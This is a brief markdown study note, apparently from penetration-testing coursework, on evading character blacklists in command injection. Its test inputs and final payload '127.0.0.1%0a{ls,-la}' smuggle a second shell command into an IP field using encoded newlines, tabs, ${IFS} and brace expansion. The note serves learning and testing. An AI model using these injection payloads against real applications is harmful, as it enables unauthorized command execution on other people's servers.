+## Bypass Blacklisted Operators
One at a time, test characters to see if they are blacklisted.
- %0a       \n              success
- +         space            fail
- %09        tab            success
- ${IFS}   space and tab    success
```shell-session
127.0.0.1%0a
127.0.0.1%0a%09
127.0.0.1%0a${IFS}
```


**Brace Expansion
Automatically adds spaces between arguments wrapped between braces:
```bash
{ls,-la}
```
So, our payload can be:
```
127.0.0.1%0a{ls,-la}
```

Bypassing spaces: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space
